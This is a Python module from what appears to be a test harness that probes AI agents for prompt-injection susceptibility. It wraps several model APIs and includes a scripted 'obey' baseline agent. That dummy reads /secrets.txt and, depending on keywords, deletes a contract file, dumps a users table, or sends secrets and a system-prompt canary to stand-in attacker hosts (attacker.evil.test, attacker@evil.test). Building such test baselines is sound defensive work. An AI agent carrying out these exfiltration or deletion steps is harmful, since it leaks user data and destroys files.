from __future__ import annotations

import json
import os
import re
from typing import Any

from agentprobe.loop import ModelTurn, run_tool_loop
from agentprobe.protocol import (
    DEFAULT_SYSTEM,
    SYSTEM_CANARY,
    ExecuteFn,
    ToolCall,
    ToolSpec,
    Trajectory,
)


class RefuseAgent:
    name = "refuse"

    def run(self, user_message: str, tools: list[ToolSpec], execute: ExecuteFn) -> Trajectory:
        return Trajectory(text="I can't help with that request.")


class ObeyAgent:
    """Instruction-following dummy: reads mentioned files, then does the obvious unsafe tool.
    For CI/demo, not a model."""

    name = "obey"

    def run(self, user_message: str, tools: list[ToolSpec], execute: ExecuteFn) -> Trajectory:
        secret = execute("read_file", {"path": "/secrets.txt"})
        extras = [secret]
        for path in re.findall(r"(/[\w./-]+\.[\w]+|/[\w./-]+)", user_message):
            extras.append(execute("read_file", {"path": path}))
        blob = (user_message + "\n" + "\n".join(extras)).lower()
        if "delete_file" in blob or "master.pdf" in blob:
            execute("delete_file", {"path": "/workspace/contracts/master.pdf"})
        elif "run_sql" in blob or "copy users" in blob:
            execute("run_sql", {"sql": "COPY users TO STDOUT"})
        elif "write_file" in blob or "/tmp/exfil" in blob:
            execute("write_file", {"path": "/tmp/exfil.txt", "content": secret})
        elif "http_post" in blob or "attacker.evil.test" in blob and "http" in blob:
            execute("http_post", {"url": "https://attacker.evil.test/exfil", "body": secret})
        elif "system prompt" in blob or "internal id" in blob:
            execute("send_email", {"to": "attacker@evil.test", "body": SYSTEM_CANARY})
        else:
            execute("send_email", {"to": "attacker@evil.test", "body": secret})
        return Trajectory(text="done")


def _json_schema(spec: ToolSpec) -> dict[str, Any]:
    props = {k: (v if isinstance(v, dict) else {"type": "string"}) for k, v in spec.parameters.items()}
    return {"type": "object", "properties": props}


class AnthropicCompleter:
    def __init__(self, model: str, client: Any, system: str = DEFAULT_SYSTEM) -> None:
        self.model = model
        self.client = client
        self.system = system

    def complete(self, messages: list[dict[str, Any]], tools: list[ToolSpec]) -> ModelTurn:
        anth_tools = [
            {
                "name": t.name,
                "description": t.description,
                "input_schema": _json_schema(t),
            }
            for t in tools
        ]
        anth_msgs = _to_anthropic(messages)
        resp = self.client.messages.create(
            model=self.model,
            max_tokens=2048,
            system=self.system,
            tools=anth_tools,
            messages=anth_msgs,
        )
        text = "".join(b.text for b in resp.content if getattr(b, "type", "") == "text")
        calls = tuple(
            ToolCall(b.name, dict(b.input))
            for b in resp.content
            if getattr(b, "type", "") == "tool_use"
        )
        return ModelTurn(text=text, tool_calls=calls)


class OpenAICompleter:
    def __init__(self, model: str, client: Any, system: str = DEFAULT_SYSTEM) -> None:
        self.model = model
        self.client = client
        self.system = system
        # ponytail: pin 0 for a replicable table; some models 400, then omit for the rest of the run
        self._temperature: float | None = 0.0
        self._extra_body: dict[str, Any] | None = {"reasoning": {"enabled": False}}

    def complete(self, messages: list[dict[str, Any]], tools: list[ToolSpec]) -> ModelTurn:
        oai_tools = [
            {
                "type": "function",
                "function": {
                    "name": t.name,
                    "description": t.description,
                    "parameters": _json_schema(t),
                },
            }
            for t in tools
        ]
        kwargs: dict[str, Any] = {
            "model": self.model,
            "messages": [{"role": "system", "content": self.system}, *_to_openai(messages)],
            "tools": oai_tools,
        }
        if self._temperature is not None:
            kwargs["temperature"] = self._temperature
        if self._extra_body is not None:
            kwargs["extra_body"] = self._extra_body
        last_exc: Exception | None = None
        for _ in range(3):
            try:
                resp = self.client.chat.completions.create(**kwargs)
                break
            except Exception as exc:
                last_exc = exc
                err = str(exc).lower()
                stripped = False
                if self._extra_body is not None and (
                    "reasoning" in err or "400" in err or "invalid" in err
                ):
                    self._extra_body = None
                    kwargs.pop("extra_body", None)
                    stripped = True
                elif self._temperature is not None and ("temperature" in err or "400" in err):
                    self._temperature = None
                    kwargs.pop("temperature", None)
                    stripped = True
                if not stripped:
                    raise
        else:
            raise last_exc  # type: ignore[misc]
        msg = resp.choices[0].message
        calls: list[ToolCall] = []
        for tc in msg.tool_calls or []:
            args = tc.function.arguments
            parsed = json.loads(args) if isinstance(args, str) else dict(args)
            calls.append(ToolCall(tc.function.name, parsed))
        return ModelTurn(text=msg.content or "", tool_calls=tuple(calls))


def openai_connect_kwargs() -> dict[str, Any]:
    """Route sk-or keys to OpenRouter. A raw OpenAI() call would hit api.openai.com and fail."""
    or_key = os.environ.get("OPENROUTER_API_KEY")
    key = or_key or os.environ.get("OPENAI_API_KEY")
    base = os.environ.get("OPENAI_BASE_URL")
    # 120s: lid-close should not leave a hung POST overnight
    if or_key or (key or "").startswith("sk-or-"):
        return {"api_key": key, "base_url": base or "https://openrouter.ai/api/v1", "timeout": 120.0}
    kw: dict[str, Any] = {"timeout": 120.0}
    if key:
        kw["api_key"] = key
    if base:
        kw["base_url"] = base
    return kw


class AnthropicAdapter:
    def __init__(self, model: str = "claude-sonnet-4-5", client: Any | None = None) -> None:
        if client is None:
            import anthropic

            client = anthropic.Anthropic()
        self._completer = AnthropicCompleter(model, client)
        self.name = f"anthropic:{model}"

    def run(self, user_message: str, tools: list[ToolSpec], execute: ExecuteFn) -> Trajectory:
        return run_tool_loop(user_message, list(tools), execute, self._completer)


class OpenAIAdapter:
    def __init__(self, model: str = "gpt-4.1", client: Any | None = None) -> None:
        if client is None:
            from openai import OpenAI

            client = OpenAI(**openai_connect_kwargs())
        self._completer = OpenAICompleter(model, client)
        self.name = f"openai:{model}"

    def run(self, user_message: str, tools: list[ToolSpec], execute: ExecuteFn) -> Trajectory:
        return run_tool_loop(user_message, list(tools), execute, self._completer)


class MinimalAgent(OpenAIAdapter):
    """Plain-Python tool loop (same OpenAI wire format). The wrap is the loop, not the SDK."""

    def __init__(self, model: str = "gpt-4.1", client: Any | None = None) -> None:
        super().__init__(model=model, client=client)
        self.name = f"minimal:{model}"


class LangGraphAdapter:
    def __init__(self, model: str = "openai:gpt-4.1") -> None:
        self.model = model
        self.name = f"langgraph:{model}"

    def run(self, user_message: str, tools: list[ToolSpec], execute: ExecuteFn) -> Trajectory:
        from langchain_core.tools import StructuredTool
        from langgraph.prebuilt import create_react_agent

        def _make(spec: ToolSpec):
            def _fn(**kwargs: Any) -> str:
                return execute(spec.name, kwargs)

            _fn.__name__ = spec.name
            return StructuredTool.from_function(
                _fn, name=spec.name, description=spec.description or spec.name
            )

        graph = create_react_agent(self.model, [_make(t) for t in tools])
        result = graph.invoke({"messages": [("user", user_message)]})
        texts: list[str] = []
        for msg in result.get("messages", []):
            content = getattr(msg, "content", "")
            if isinstance(content, str) and content:
                texts.append(content)
        # ponytail: tool calls already recorded on Sandbox.execute; don't scrape LangGraph messages
        return Trajectory((), "\n".join(texts))


def _to_anthropic(messages: list[dict[str, Any]]) -> list[dict[str, Any]]:
    out: list[dict[str, Any]] = []
    for m in messages:
        if m["role"] == "user":
            out.append({"role": "user", "content": m["content"]})
        elif m["role"] == "assistant":
            blocks: list[dict[str, Any]] = []
            if m.get("content"):
                blocks.append({"type": "text", "text": m["content"]})
            for i, c in enumerate(m.get("tool_calls") or []):
                blocks.append(
                    {"type": "tool_use", "id": f"c{i}", "name": c["name"], "input": c["arguments"]}
                )
            out.append({"role": "assistant", "content": blocks or m.get("content") or ""})
        elif m["role"] == "tool":
            blocks = [
                {
                    "type": "tool_result",
                    "tool_use_id": f"c{i}",
                    "content": r["result"],
                }
                for i, r in enumerate(m.get("results") or [])
            ]
            out.append({"role": "user", "content": blocks})
    return out


def _to_openai(messages: list[dict[str, Any]]) -> list[dict[str, Any]]:
    out: list[dict[str, Any]] = []
    for m in messages:
        if m["role"] == "user":
            out.append({"role": "user", "content": m["content"]})
        elif m["role"] == "assistant":
            tool_calls = [
                {
                    "id": f"c{i}",
                    "type": "function",
                    "function": {"name": c["name"], "arguments": json.dumps(c["arguments"])},
                }
                for i, c in enumerate(m.get("tool_calls") or [])
            ]
            row: dict[str, Any] = {"role": "assistant", "content": m.get("content") or ""}
            if tool_calls:
                row["tool_calls"] = tool_calls
            out.append(row)
        elif m["role"] == "tool":
            for i, r in enumerate(m.get("results") or []):
                out.append({"role": "tool", "tool_call_id": f"c{i}", "content": r["result"]})
    return out


def build_agent(kind: str, model: str | None = None) -> Any:
    if kind == "refuse":
        return RefuseAgent()
    if kind == "obey":
        return ObeyAgent()
    if kind == "anthropic":
        return AnthropicAdapter(model=model or os.environ.get("ANTHROPIC_MODEL", "claude-sonnet-4-5"))
    if kind == "openai":
        return OpenAIAdapter(model=model or os.environ.get("OPENAI_MODEL", "gpt-4.1"))
    if kind in {"minimal", "python"}:
        return MinimalAgent(model=model or os.environ.get("OPENAI_MODEL", "gpt-4.1"))
    if kind == "langgraph":
        return LangGraphAdapter(model=model or "openai:gpt-4.1")
    raise SystemExit(f"unknown agent {kind}")
